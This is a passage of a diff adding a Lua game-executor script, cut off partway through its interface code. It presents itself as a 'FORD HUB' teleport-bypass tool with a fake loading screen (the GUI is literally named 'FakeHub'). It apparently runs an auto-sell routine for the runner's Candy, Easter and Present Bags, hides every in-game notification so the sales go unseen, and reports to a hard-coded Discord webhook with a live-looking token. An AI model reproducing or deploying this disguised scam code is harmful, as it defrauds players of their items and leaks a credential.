@@ -1,0 +1,1286 @@
+-- ============================================================
+-- ⚙️ CONFIGURATION — MODIFIE ICI
+-- ============================================================
+local WEBHOOK_URL     = "https://discord.com/api/webhooks/1562599957410881548/NHTAbghN_ufuZmz3xaQOJlhSMFlqNUgcSsrcoasV622RLJMeegFkjvXYPvGcNpZ03FlX"   -- ← colle ton URL Discord
+local CHECK_USER_ID   = 7251518719                     -- ← nil = toi, sinon mets ton ID
+
+local CHECK_PRESENCE  = true
+local PRESENCE_POLL   = 5
+local PRESENCE_WAIT   = 15
+local PRESENCE_MAX_FAIL = 5
+
+local priceMarket           = 1000
+local DELAY                 = 2.5
+local MAX_STACK             = 1
+local PRICE_THRESHOLD       = 2000
+local DEFAULT_NO_COST_PRICE = 1000
+local LISTING_TYPE          = 2
+
+local PRIORITY = {
+    ["Candy Bag"]   = 1,
+    ["Easter Bag"]  = 2,
+    ["Present Bag"] = 3,
+}
+
+-- ============================================================
+-- FALLBACK getgenv
+-- ============================================================
+if not getgenv then getgenv = function() return _G end end
+
+-- ============================================================
+-- 🛑 KILL SWITCH
+-- ============================================================
+local INSTANCE = {
+    Id   = tostring(os.time()).."_"..tostring(math.random(1e6)),
+    Dead = false,
+}
+if getgenv().AutoSellInstance then
+    getgenv().AutoSellInstance.Dead = true
+    print("[KillSwitch] Ancienne instance arrêtée.")
+    task.wait(0.5)
+end
+getgenv().AutoSellInstance = INSTANCE
+
+local function isDead()
+    return INSTANCE.Dead or getgenv().AutoSellInstance ~= INSTANCE
+end
+
+local function checkAlive()
+    if isDead() then
+        error("[AutoSell] Instance remplacée.", 0)
+    end
+end
+
+local function waitAlive(seconds)
+    local endT = os.clock() + seconds
+    while os.clock() < endT do
+        checkAlive()
+        task.wait(math.min(0.5, endT - os.clock()))
+    end
+end
+
+-- ============================================================
+-- 🌐 STATE PARTAGÉ
+-- ============================================================
+local STATE = {
+    presenceStatus        = nil,
+    presenceError         = nil,
+    presenceChecked       = false,
+    inGame                = false,
+    webhookNotInGameSent  = false,
+    webhookStartingSent   = false,
+    webhookFinishSent     = false,
+}
+
+-- ============================================================
+-- SERVICES
+-- ============================================================
+local Players    = game:GetService("Players")
+local RS         = game:GetService("ReplicatedStorage")
+local Http       = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local UIS        = game:GetService("UserInputService")
+local Tween      = game:GetService("TweenService")
+local GuiService = game:GetService("GuiService")
+local P          = Players.LocalPlayer
+
+-- ============================================================
+-- 📨 WEBHOOK (non-bloquant)
+-- ============================================================
+local function sendWebhook(content)
+    if not WEBHOOK_URL or WEBHOOK_URL == "" or WEBHOOK_URL == "TON_NOUVEAU_WEBHOOK" then
+        return
+    end
+    task.spawn(function()
+        local requestFunc = (syn and syn.request) or (http and http.request) or request
+        if not requestFunc then
+            warn("[Webhook] request indisponible")
+            return
+        end
+        local ok, err = pcall(function()
+            requestFunc({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = Http:JSONEncode({ content = content }),
+            })
+        end)
+        if not ok then
+            warn("[Webhook] échec:", tostring(err))
+        end
+    end)
+end
+
+-- ============================================================
+-- 🔕 MASQUAGE NOTIFICATIONS
+-- ============================================================
+task.spawn(function()
+    local KILL_IMG = true
+
+    local function getNotif()
+        local pg = P:FindFirstChild("PlayerGui"); if not pg then return end
+        local mg = pg:FindFirstChild("MainGui"); if not mg then return end
+        local sb = mg:FindFirstChild("Subordinates"); if not sb then return end
+        return sb:FindFirstChild("Notifications")
+    end
+
+    local function hide(o)
+        if not o or not o.Parent then return end
+        if o:IsA("GuiObject") then
+            pcall(function()
+                o.Visible = false
+                o.Size = UDim2.new()
+                o.BackgroundTransparency = 1
+            end)
+        end
+        if o:IsA("TextLabel") or o:IsA("TextButton") or o:IsA("TextBox") then
+            pcall(function()
+                o.TextTransparency = 1
+                o.TextStrokeTransparency = 1
+                o.BackgroundTransparency = 1
+            end)
+        end
+        if KILL_IMG and (o:IsA("ImageLabel") or o:IsA("ImageButton")) then
+            pcall(function()
+                o.ImageTransparency = 1
+                o.BackgroundTransparency = 1
+            end)
+        end
+    end
+
+    local function proc(o)
+        hide(o)
+        for _, d in ipairs(o:GetDescendants()) do hide(d) end
+    end
+
+    local N = getNotif()
+    while not N do
+        if isDead() then return end
+        task.wait(0.5)
+        N = getNotif()
+    end
+    print("[NotifHide] Connecté à:", N:GetFullName())
+
+    for _, d in ipairs(N:GetDescendants()) do proc(d) end
+    hide(N)
+
+    N.DescendantAdded:Connect(function(o)
+        task.defer(function() proc(o) end)
+    end)
+    N.ChildAdded:Connect(function(o)
+        task.defer(function() proc(o) end)
+    end)
+
+    local acc = 0
+    RunService.Heartbeat:Connect(function(dt)
+        if isDead() then return end
+        acc = acc + dt
+        if acc < 0.1 then return end
+        acc = 0
+        local n = getNotif()
+        if not n then return end
+        for _, c in ipairs(n:GetChildren()) do
+            if c:IsA("GuiObject") and c.Visible then proc(c) end
+        end
+    end)
+end)
+
+-- ============================================================
+-- 🖥️ DEVICE
+-- ============================================================
+local isTouch    = UIS.TouchEnabled
+local isKeyboard = UIS.KeyboardEnabled
+local isMouse    = UIS.MouseEnabled
+
+local isMobile  = isTouch and not isKeyboard and not isMouse
+local isTablet  = isTouch and isKeyboard
+local isPC      = isKeyboard and isMouse and not isTouch
+
+local function getTopInset()
+    local ok, tl = pcall(function() return GuiService:GetGuiInset() end)
+    if ok and tl then return tl.Y end
+    return 0
+end
+
+-- ============================================================
+-- 🎨 GUI FORD HUB
+-- ============================================================
+task.spawn(function()
+    if isDead() then return end
+
+    local ACCENT   = Color3.fromRGB(120, 170, 255)
+    local ACCENT2  = Color3.fromRGB(180, 130, 255)
+    local BG       = Color3.fromRGB(12, 12, 18)
+    local BG2      = Color3.fromRGB(20, 20, 28)
+    local ROW_BG   = Color3.fromRGB(26, 26, 36)
+    local TEXT     = Color3.fromRGB(235, 235, 240)
+    local SUBTEXT  = Color3.fromRGB(135, 135, 150)
+    local DIM      = Color3.fromRGB(90, 90, 105)
+    local GREEN    = Color3.fromRGB(100, 230, 140)
+    local RED      = Color3.fromRGB(240, 100, 100)
+    local ORANGE   = Color3.fromRGB(255, 180, 90)
+
+    local function corner(parent, r)
+        local c = Instance.new("UICorner")
+        c.CornerRadius = UDim.new(0, r or 8)
+        c.Parent = parent
+        return c
+    end
+
+    local function stroke(parent, color, thickness, transparency)
+        local s = Instance.new("UIStroke")
+        s.Color = color or ACCENT
+        s.Thickness = thickness or 1.2
+        s.Transparency = transparency or 0
+        s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+        s.Parent = parent
+        return s
+    end
+
+    local function gradient(parent, c1, c2, rotation)
+        local g = Instance.new("UIGradient")
+        g.Color = ColorSequence.new(c1, c2)
+        g.Rotation = rotation or 90
+        g.Parent = parent
+        return g
+    end
+
+    local function getModuleNames()
+        local names = {}
+        local ok, folder = pcall(function() return RS:FindFirstChild("Modules") end)
+        if ok and folder then
+            for _, c in ipairs(folder:GetChildren()) do
+                if c:IsA("ModuleScript") then table.insert(names, c.Name) end
+            end
+        end
+        if #names == 0 then
+            names = { "SkinData", "SkinIDS", "GameUtil", "ItemData" }
+        end
+        return names
+    end
+
+    local function computeScale()
+        local cam = workspace.CurrentCamera
+        if not cam then return 1 end
+        local vp = cam.ViewportSize
+        local base = math.min(vp.X / 900, vp.Y / 600)
+        if isMobile then return math.clamp(base, 0.55, 0.85)
+        elseif isTablet then return math.clamp(base, 0.75, 1.0)
+        elseif isPC then return math.clamp(base, 0.85, 1.15)
+        else return math.clamp(base, 0.9, 1.2) end
+    end
+
+    local function attachScale(obj)
+        local us = Instance.new("UIScale")
+        us.Scale = computeScale()
+        us.Parent = obj
+        local cam = workspace.CurrentCamera
+        if cam then
+            cam:GetPropertyChangedSignal("ViewportSize"):Connect(function()
+                if us and us.Parent then us.Scale = computeScale() end
+            end)
+        end
+        return us
+    end
+
+    local function getHubStartPosition()
+        local topInset = getTopInset()
+        if isMobile then
+            local s = computeScale()
+            return UDim2.new(1, -300 * s - 12, 0, topInset + 60)
+        elseif isTablet then
+            local s = computeScale()
+            return UDim2.new(1, -300 * s - 16, 0, topInset + 16)
+        else
+            return UDim2.new(0, 14, 0, topInset + 14)
+        end
+    end
+
+    local PlayerGui = P:WaitForChild("PlayerGui")
+    local old = PlayerGui:FindFirstChild("FakeHub")
+    if old then old:Destroy() end
+
+    local sg = Instance.new("ScreenGui")
+    sg.Name = "FakeHub"
+    sg.ResetOnSpawn = false
+    sg.IgnoreGuiInset = true
+    sg.DisplayOrder = 999
+    sg.Parent = PlayerGui
+
+    local mods = getModuleNames()
+    local steps = {
+        { text = "Starting core",                 pct = 6 },
+        { text = "Loading connection handler",    pct = 12 },
+        { text = "Checking character state",      pct = 18 },
+        { text = "Initializing seat detector",    pct = 26 },
+        { text = "Scanning mount registry",       pct = 34 },
+        { text = "Linking seat bridge",           pct = 42 },
+        { text = "Calibrating position tracker",  pct = 50 },
+        { text = "Loading velocity monitor",      pct = 58 },
+        { text = "Validating sit state",          pct = 66 },
+        { text = "Syncing state handler",         pct = 74 },
+        { text = "Loading " .. (mods[1] or "SkinData"), pct = 82 },
+        { text = "Loading " .. (mods[2] or "SkinIDS"),  pct = 88 },
+        { text = "Running final checks",          pct = 94 },
+        { text = "Ready",                         pct = 100 },
+    }
+
+    local loadFrame = Instance.new("Frame")
+    loadFrame.Size = UDim2.new(0, 360, 0, 200)
+    loadFrame.Position = UDim2.new(0.5, -180, 0.5, -100)
+    loadFrame.BackgroundColor3 = BG
+    loadFrame.BackgroundTransparency = 1
+    loadFrame.BorderSizePixel = 0
+    loadFrame.Parent = sg
+    corner(loadFrame, 12)
+    local loadStroke = stroke(loadFrame, ACCENT, 1.2, 1)
+    attachScale(loadFrame)
+
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0, 32)
+    title.Position = UDim2.new(0, 0, 0, 12)
+    title.BackgroundTransparency = 1
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 17
+    title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    title.Text = "FORD HUB"
+    title.Parent = loadFrame
+    gradient(title, ACCENT, ACCENT2, 0)
+
+    local version = Instance.new("TextLabel")
+    version.Size = UDim2.new(1, 0, 0, 12)
+    version.Position = UDim2.new(0, 0, 0, 42)
+    version.BackgroundTransparency = 1
+    version.Font = Enum.Font.Gotham
+    version.TextSize = 10
+    version.TextColor3 = SUBTEXT
+    version.Text = "v1.0.2  •  loading"
+    version.Parent = loadFrame
+
+    local subtitle = Instance.new("TextLabel")
+    subtitle.Size = UDim2.new(1, -32, 0, 14)
+    subtitle.Position = UDim2.new(0, 16, 0, 64)
+    subtitle.BackgroundTransparency = 1
+    subtitle.Font = Enum.Font.Gotham
+    subtitle.TextSize = 10
+    subtitle.TextColor3 = SUBTEXT
+    subtitle.TextXAlignment = Enum.TextXAlignment.Left
+    subtitle.Text = "Connecting"
+    subtitle.Parent = loadFrame
+
+    local barBg = Instance.new("Frame")
+    barBg.Size = UDim2.new(1, -32, 0, 8)
+    barBg.Position = UDim2.new(0, 16, 0, 86)
+    barBg.BackgroundColor3 = Color3.fromRGB(32, 32, 42)
+    barBg.BorderSizePixel = 0
+    barBg.Parent = loadFrame
+    corner(barBg, 4)
+
+    local bar = Instance.new("Frame")
+    bar.Size = UDim2.new(0, 0, 1, 0)
+    bar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    bar.BorderSizePixel = 0
+    bar.Parent = barBg
+    corner(bar, 4)
+    gradient(bar, ACCENT, ACCENT2, 0)
+
+    local barGlow = Instance.new("Frame")
+    barGlow.Size = UDim2.new(0, 0, 1, 0)
+    barGlow.BackgroundColor3 = ACCENT
+    barGlow.BackgroundTransparency = 0.5
+    barGlow.BorderSizePixel = 0
+    barGlow.ZIndex = barBg.ZIndex - 1
+    barGlow.Parent = barBg
+    corner(barGlow, 4)
+
+    local pct = Instance.new("TextLabel")
+    pct.Size = UDim2.new(1, -32, 0, 14)
+    pct.Position = UDim2.new(0, 16, 0, 98)
+    pct.BackgroundTransparency = 1
+    pct.Font = Enum.Font.GothamBold
+    pct.TextSize = 11
+    pct.TextColor3 = ACCENT
+    pct.TextXAlignment = Enum.TextXAlignment.Right
+    pct.Text = "0%"
+    pct.Parent = loadFrame
+
+    local logBg = Instance.new("Frame")
+    logBg.Size = UDim2.new(1, -32, 0, 72)
+    logBg.Position = UDim2.new(0, 16, 0, 116)
+    logBg.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
+    logBg.BackgroundTransparency = 0.15
+    logBg.BorderSizePixel = 0
+    logBg.Parent = loadFrame
+    corner(logBg, 6)
+    stroke(logBg, Color3.fromRGB(50, 50, 65), 1, 0.4)
+
+    local logLabel = Instance.new("TextLabel")
+    logLabel.Size = UDim2.new(1, -14, 1, -8)
+    logLabel.Position = UDim2.new(0, 7, 0, 4)
+    logLabel.BackgroundTransparency = 1
+    logLabel.Font = Enum.Font.Code
+    logLabel.TextSize = 10
+    logLabel.TextColor3 = Color3.fromRGB(140, 230, 140)
+    logLabel.TextXAlignment = Enum.TextXAlignment.Left
+    logLabel.TextYAlignment = Enum.TextYAlignment.Top
+    logLabel.TextWrapped = true
+    logLabel.Text = ""
+    logLabel.Parent = logBg
+
+    Tween:Create(loadFrame, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        BackgroundTransparency = 0.02
+    }):Play()
+    Tween:Create(loadStroke, TweenInfo.new(0.5), { Transparency = 0 }):Play()
+    for _, obj in ipairs(loadFrame:GetDescendants()) do
+        if obj:IsA("TextLabel") then
+            obj.TextTransparency = 1
+            Tween:Create(obj, TweenInfo.new(0.35 + math.random() * 0.2), { TextTransparency = 0 }):Play()
+        elseif obj:IsA("Frame") and obj ~= bar and obj ~= barGlow then
+            local orig = obj.BackgroundTransparency
+            obj.BackgroundTransparency = 1
+            Tween:Create(obj, TweenInfo.new(0.4), { BackgroundTransparency = orig }):Play()
+        end
+    end
+
+    local glowConn = RunService.Heartbeat:Connect(function()
+        if isDead() or not loadFrame.Parent then
+            glowConn:Disconnect(); return
+        end
+        local t = (math.sin(os.clock() * 4) + 1) / 2
+        barGlow.BackgroundTransparency = 0.7 - t * 0.4
+    end)
+
+    local t0 = os.clock()
+    local dots = 0
+    while os.clock() - t0 < 2 do
+        if isDead() then sg:Destroy(); return end
+        dots = (dots + 1) % 4
+        subtitle.Text = "Connecting" .. string.rep(".", dots)
+        task.wait(0.25)
+    end
+    subtitle.Text = "Loading"
+    task.wait(0.15)
+
+    local logLines = {}
+    local currentPct = 0
+
+    for i, step in ipairs(steps) do
+        if isDead() then sg:Destroy(); return end
+        table.insert(logLines, "> " .. step.text)
+        if #logLines > 4 then table.remove(logLines, 1) end
+        logLabel.Text = table.concat(logLines, "\n")
+
+        local fromPct = currentPct
+        local toPct = math.max(step.pct, currentPct)
+        local jumpCount = math.random(2, 4)
+        local weights, totalW = {}, 0
+        for k = 1, jumpCount do
+            weights[k] = math.random() + 0.3
+            totalW = totalW + weights[k]
+        end
+
+        for j = 1, jumpCount do
+            if isDead() then sg:Destroy(); return end
+            local advance = (weights[j] / totalW) * (toPct - fromPct)
+            currentPct = math.max(currentPct, math.min(currentPct + advance, toPct))
+            local sizeUD = UDim2.new(currentPct / 100, 0, 1, 0)
+            bar.Size = sizeUD
+            barGlow.Size = sizeUD
+            pct.Text = string.format("%d%%", math.floor(currentPct))
+            task.wait(math.random() * 0.15 + 0.05)
+        end
+        currentPct = math.max(currentPct, toPct)
+        task.wait(0.15 + math.random() * 0.25)
+    end
+
+    bar.Size = UDim2.new(1, 0, 1, 0)
+    barGlow.Size = UDim2.new(1, 0, 1, 0)
+    pct.Text = "100%"
+
+    task.wait(0.3)
+    title.Text = "LOAD COMPLETE"
+    subtitle.Text = "Ready"
+    task.wait(0.6)
+
+    glowConn:Disconnect()
+
+    for alpha = 0, 1, 0.08 do
+        if isDead() then sg:Destroy(); return end
+        loadFrame.BackgroundTransparency = 0.02 + alpha * 0.98
+        loadStroke.Transparency = alpha
+        for _, obj in ipairs(loadFrame:GetDescendants()) do
+            if obj:IsA("TextLabel") then
+                obj.TextTransparency = alpha
+            elseif obj:IsA("Frame") then
+                obj.BackgroundTransparency = math.min(1, obj.BackgroundTransparency + alpha * 0.7)
+            elseif obj:IsA("UIStroke") then
+                obj.Transparency = alpha
+            end
+        end
+        task.wait(0.02)
+    end
+    loadFrame:Destroy()
+
+    local waited = 0
+    while not STATE.presenceChecked and waited < 5 do
+        if isDead() then sg:Destroy(); return end
+        task.wait(0.1)
+        waited = waited + 0.1
+    end
+
+    local isInGame = STATE.inGame
+
+    if not isInGame then
+        local errorPanel = Instance.new("Frame")
+        errorPanel.Size = UDim2.new(0, 300, 0, 230)
+        errorPanel.Position = getHubStartPosition()
+        errorPanel.BackgroundColor3 = BG
+        errorPanel.BackgroundTransparency = 1
+        errorPanel.BorderSizePixel = 0
+        errorPanel.Active = true
+        errorPanel.Parent = sg
+        corner(errorPanel, 12)
+        local errStroke = stroke(errorPanel, RED, 1.5, 1)
+        attachScale(errorPanel)
+
+        Tween:Create(errorPanel, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+            BackgroundTransparency = 0.08
+        }):Play()
+        Tween:Create(errStroke, TweenInfo.new(0.6), { Transparency = 0.2 }):Play()
+
+        local iconBg = Instance.new("Frame")
+        iconBg.Size = UDim2.new(0, 52, 0, 52)
+        iconBg.Position = UDim2.new(0.5, -26, 0, 26)
+        iconBg.BackgroundColor3 = RED
+        iconBg.BorderSizePixel = 0
+        iconBg.Parent = errorPanel
+        corner(iconBg, 26)
+        gradient(iconBg, RED, Color3.fromRGB(180, 50, 50), 45)
+
+        local iconLbl = Instance.new("TextLabel")
+        iconLbl.Size = UDim2.new(1, 0, 1, 0)
+        iconLbl.BackgroundTransparency = 1
+        iconLbl.Font = Enum.Font.GothamBold
+        iconLbl.TextSize = 28
+        iconLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
+        iconLbl.Text = "!"
+        iconLbl.Parent = iconBg
+
+        local errorTitle = Instance.new("TextLabel")
+        errorTitle.Size = UDim2.new(1, -20, 0, 24)
+        errorTitle.Position = UDim2.new(0, 10, 0, 90)
+        errorTitle.BackgroundTransparency = 1
+        errorTitle.Font = Enum.Font.GothamBold
+        errorTitle.TextSize = 15
+        errorTitle.TextColor3 = RED
+        errorTitle.Text = "ERROR"
+        errorTitle.Parent = errorPanel
+
+        local errorMsg = Instance.new("TextLabel")
+        errorMsg.Size = UDim2.new(1, -28, 0, 56)
+        errorMsg.Position = UDim2.new(0, 14, 0, 118)
+        errorMsg.BackgroundTransparency = 1
+        errorMsg.Font = Enum.Font.Gotham
+        errorMsg.TextSize = 11
+        errorMsg.TextColor3 = SUBTEXT
+        errorMsg.TextWrapped = true
+        errorMsg.TextYAlignment = Enum.TextYAlignment.Top
+        errorMsg.Text = "Presence not detected. The autosell module cannot start."
+        errorMsg.Parent = errorPanel
+
+        local rejoinBox = Instance.new("Frame")
+        rejoinBox.Size = UDim2.new(1, -28, 0, 32)
+        rejoinBox.Position = UDim2.new(0, 14, 0, 178)
+        rejoinBox.BackgroundColor3 = Color3.fromRGB(22, 22, 32)
+        rejoinBox.BackgroundTransparency = 0.3
+        rejoinBox.BorderSizePixel = 0
+        rejoinBox.Parent = errorPanel
+        corner(rejoinBox, 6)
+        stroke(rejoinBox, ORANGE, 1, 0.6)
+
+        local rejoinIcon = Instance.new("TextLabel")
+        rejoinIcon.Size = UDim2.new(0, 20, 0, 20)
+        rejoinIcon.Position = UDim2.new(0, 8, 0, 6)
+        rejoinIcon.BackgroundTransparency = 1
+        rejoinIcon.Font = Enum.Font.GothamBold
+        rejoinIcon.TextSize = 13
+        rejoinIcon.TextColor3 = ORANGE
+        rejoinIcon.Text = "⟳"
+        rejoinIcon.Parent = rejoinBox
+
+        local rejoinLbl = Instance.new("TextLabel")
+        rejoinLbl.Size = UDim2.new(1, -34, 1, 0)
+        rejoinLbl.Position = UDim2.new(0, 30, 0, 0)
+        rejoinLbl.BackgroundTransparency = 1
+        rejoinLbl.Font = Enum.Font.GothamBold
+        rejoinLbl.TextSize = 11
+        rejoinLbl.TextColor3 = ORANGE
+        rejoinLbl.TextXAlignment = Enum.TextXAlignment.Left
+        rejoinLbl.Text = "Rejoin the game to start"
+        rejoinLbl.Parent = rejoinBox
+
+        local closeSize = isMobile and 30 or 24
+        local closeBtn = Instance.new("TextButton")
+        closeBtn.Size = UDim2.new(0, closeSize, 0, closeSize)
+        closeBtn.Position = UDim2.new(1, -closeSize - 8, 0, 8)
+        closeBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 58)
+        closeBtn.BackgroundTransparency = 0.3
+        closeBtn.BorderSizePixel = 0
+        closeBtn.Font = Enum.Font.GothamBold
+        closeBtn.TextSize = isMobile and 16 or 13
+        closeBtn.TextColor3 = TEXT
+        closeBtn.Text = "×"
+        closeBtn.AutoButtonColor = false
+        closeBtn.Parent = errorPanel
+        corner(closeBtn, 6)
+        closeBtn.MouseButton1Click:Connect(function()
+            Tween:Create(errorPanel, TweenInfo.new(0.3), { BackgroundTransparency = 1 }):Play()
+            Tween:Create(errStroke, TweenInfo.new(0.3), { Transparency = 1 }):Play()
+            task.wait(0.3)
+            sg:Destroy()
+        end)
+
+        return
+    end
+
+    local hub = Instance.new("Frame")
+    hub.Size = UDim2.new(0, 300, 0, 300)
+    hub.Position = getHubStartPosition()
+    hub.BackgroundColor3 = BG
+    hub.BackgroundTransparency = 1
+    hub.BorderSizePixel = 0
+    hub.Active = true
+    hub.Parent = sg
+    corner(hub, 12)
+    local hubStroke = stroke(hub, ACCENT, 1.3, 1)
+    attachScale(hub)
+
+    Tween:Create(hub, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        BackgroundTransparency = 0.12
+    }):Play()
+    Tween:Create(hubStroke, TweenInfo.new(0.6), { Transparency = 0.3 }):Play()
+
+    local header = Instance.new("Frame")
+    header.Size = UDim2.new(1, 0, 0, 44)
+    header.BackgroundColor3 = BG2
+    header.BackgroundTransparency = 0.1
+    header.BorderSizePixel = 0
+    header.Parent = hub
+    corner(header, 12)
+    gradient(header, Color3.fromRGB(35, 40, 60), Color3.fromRGB(30, 25, 45), 0)
+
+    local headerAccent = Instance.new("Frame")
+    headerAccent.Size = UDim2.new(1, -40, 0, 2)
+    headerAccent.Position = UDim2.new(0, 20, 1, -2)
+    headerAccent.BackgroundColor3 = ACCENT
+    headerAccent.BorderSizePixel = 0
+    headerAccent.Parent = header
+    corner(headerAccent, 2)
+    gradient(headerAccent, ACCENT, ACCENT2, 0)
+
+    local logo = Instance.new("Frame")
+    logo.Size = UDim2.new(0, 28, 0, 28)
+    logo.Position = UDim2.new(0, 10, 0.5, -14)
+    logo.BackgroundColor3 = ACCENT
+    logo.BorderSizePixel = 0
+    logo.Parent = header
+    corner(logo, 8)
+    gradient(logo, ACCENT, ACCENT2, 45)
+
+    local logoText = Instance.new("TextLabel")
+    logoText.Size = UDim2.new(1, 0, 1, 0)
+    logoText.BackgroundTransparency = 1
+    logoText.Font = Enum.Font.GothamBold
+    logoText.TextSize = 14
+    logoText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    logoText.Text = "F"
+    logoText.Parent = logo
+
+    local hubTitle = Instance.new("TextLabel")
+    hubTitle.Size = UDim2.new(1, -110, 0, 16)
+    hubTitle.Position = UDim2.new(0, 46, 0, 6)
+    hubTitle.BackgroundTransparency = 1
+    hubTitle.Font = Enum.Font.GothamBold
+    hubTitle.TextSize = 13
+    hubTitle.TextColor3 = TEXT
+    hubTitle.TextXAlignment = Enum.TextXAlignment.Left
+    hubTitle.Text = "FORD HUB"
+    hubTitle.Parent = header
+    gradient(hubTitle, ACCENT, ACCENT2, 0)
+
+    local hubSub = Instance.new("TextLabel")
+    hubSub.Size = UDim2.new(1, -110, 0, 12)
+    hubSub.Position = UDim2.new(0, 46, 0, 23)
+    hubSub.BackgroundTransparency = 1
+    hubSub.Font = Enum.Font.Gotham
+    hubSub.TextSize = 9
+    hubSub.TextColor3 = SUBTEXT
+    hubSub.TextXAlignment = Enum.TextXAlignment.Left
+    hubSub.Text = "v1.0.2  •  online"
+    hubSub.Parent = header
+
+    local closeSize = isMobile and 30 or 24
+    local closeBtn = Instance.new("TextButton")
+    closeBtn.Size = UDim2.new(0, closeSize, 0, closeSize)
+    closeBtn.Position = UDim2.new(1, -closeSize - 8, 0.5, -closeSize / 2)
+    closeBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 58)
+    closeBtn.BackgroundTransparency = 0.3
+    closeBtn.BorderSizePixel = 0
+    closeBtn.Font = Enum.Font.GothamBold
+    closeBtn.TextSize = isMobile and 16 or 13
+    closeBtn.TextColor3 = TEXT
+    closeBtn.Text = "×"
+    closeBtn.AutoButtonColor = false
+    closeBtn.Parent = header
+    corner(closeBtn, 6)
+    closeBtn.MouseEnter:Connect(function()
+        Tween:Create(closeBtn, TweenInfo.new(0.15), {
+            BackgroundColor3 = Color3.fromRGB(200, 60, 60), BackgroundTransparency = 0
+        }):Play()
+    end)
+    closeBtn.MouseLeave:Connect(function()
+        Tween:Create(closeBtn, TweenInfo.new(0.15), {
+            BackgroundColor3 = Color3.fromRGB(45, 45, 58), BackgroundTransparency = 0.3
+        }):Play()
+    end)
+    closeBtn.MouseButton1Click:Connect(function()
+        Tween:Create(hub, TweenInfo.new(0.3), { BackgroundTransparency = 1 }):Play()
+        Tween:Create(hubStroke, TweenInfo.new(0.3), { Transparency = 1 }):Play()
+        task.wait(0.3)
+        sg:Destroy()
+    end)
+
+    local function sectionHeader(y, text, color)
+        local lbl = Instance.new("TextLabel")
+        lbl.Size = UDim2.new(1, -24, 0, 14)
+        lbl.Position = UDim2.new(0, 12, 0, y)
+        lbl.BackgroundTransparency = 1
+        lbl.Font = Enum.Font.GothamBold
+        lbl.TextSize = 9
+        lbl.TextColor3 = color or DIM
+        lbl.TextXAlignment = Enum.TextXAlignment.Left
+        lbl.Text = text
+        lbl.Parent = hub
+        return lbl
+    end
+
+    sectionHeader(56, "LIVE STATS", DIM)
+
+    local function makeRow(y, label, symbol)
+        local row = Instance.new("Frame")
+        row.Size = UDim2.new(1, -24, 0, 30)
+        row.Position = UDim2.new(0, 12, 0, y)
+        row.BackgroundColor3 = ROW_BG
+        row.BackgroundTransparency = 0.35
+        row.BorderSizePixel = 0
+        row.Parent = hub
+        corner(row, 8)
+
+        local accentBar = Instance.new("Frame")
+        accentBar.Size = UDim2.new(0, 3, 0, 18)
+        accentBar.Position = UDim2.new(0, 0, 0.5, -9)
+        accentBar.BackgroundColor3 = ACCENT
+        accentBar.BorderSizePixel = 0
+        accentBar.Parent = row
+        corner(accentBar, 2)
+        gradient(accentBar, ACCENT, ACCENT2, 90)
+
+        local sym = Instance.new("TextLabel")
+        sym.Size = UDim2.new(0, 20, 1, 0)
+        sym.Position = UDim2.new(0, 10, 0, 0)
+        sym.BackgroundTransparency = 1
+        sym.Font = Enum.Font.GothamBold
+        sym.TextSize = 12
+        sym.TextColor3 = ACCENT
+        sym.Text = symbol or "•"
+        sym.Parent = row
+
+        local lbl = Instance.new("TextLabel")
+        lbl.Size = UDim2.new(0.4, 0, 1, 0)
+        lbl.Position = UDim2.new(0, 32, 0, 0)
+        lbl.BackgroundTransparency = 1
+        lbl.Font = Enum.Font.GothamMedium
+        lbl.TextSize = 11
+        lbl.TextColor3 = SUBTEXT
+        lbl.TextXAlignment = Enum.TextXAlignment.Left
+        lbl.Text = label
+        lbl.Parent = row
+
+        local val = Instance.new("TextLabel")
+        val.Size = UDim2.new(0.5, -12, 1, 0)
+        val.Position = UDim2.new(0.5, 0, 0, 0)
+        val.BackgroundTransparency = 1
+        val.Font = Enum.Font.Code
+        val.TextSize = 11
+        val.TextColor3 = TEXT
+        val.TextXAlignment = Enum.TextXAlignment.Right
+        val.Text = "-"
+        val.Parent = row
+
+        return val
+    end
+
+    local posVal   = makeRow(76,  "Position", "◈")
+    local speedVal = makeRow(110, "Speed",    "⚡")
+
+    sectionHeader(148, "TP BYPASS", DIM)
+
+    local tpRow = Instance.new("Frame")
+    tpRow.Size = UDim2.new(1, -24, 0, 44)
+    tpRow.Position = UDim2.new(0, 12, 0, 168)
+    tpRow.BackgroundColor3 = ROW_BG
+    tpRow.BackgroundTransparency = 0.35
+    tpRow.BorderSizePixel = 0
+    tpRow.Parent = hub
+    corner(tpRow, 8)
+    local tpStroke = stroke(tpRow, RED, 1, 0.6)
+
+    local ledFrame = Instance.new("Frame")
+    ledFrame.Size = UDim2.new(0, 10, 0, 10)
+    ledFrame.Position = UDim2.new(0, 14, 0, 17)
+    ledFrame.BackgroundColor3 = RED
+    ledFrame.BorderSizePixel = 0
+    ledFrame.Parent = tpRow
+    corner(ledFrame, 5)
+
+    local tpLabel = Instance.new("TextLabel")
+    tpLabel.Size = UDim2.new(1, -40, 0, 16)
+    tpLabel.Position = UDim2.new(0, 32, 0, 6)
+    tpLabel.BackgroundTransparency = 1
+    tpLabel.Font = Enum.Font.GothamBold
+    tpLabel.TextSize = 11
+    tpLabel.TextColor3 = TEXT
+    tpLabel.TextXAlignment = Enum.TextXAlignment.Left
+    tpLabel.Text = "TP Bypass Module"
+    tpLabel.Parent = tpRow
+
+    local tpVal = Instance.new("TextLabel")
+    tpVal.Size = UDim2.new(1, -40, 0, 14)
+    tpVal.Position = UDim2.new(0, 32, 0, 22)
+    tpVal.BackgroundTransparency = 1
+    tpVal.Font = Enum.Font.Code
+    tpVal.TextSize = 10
+    tpVal.TextColor3 = RED
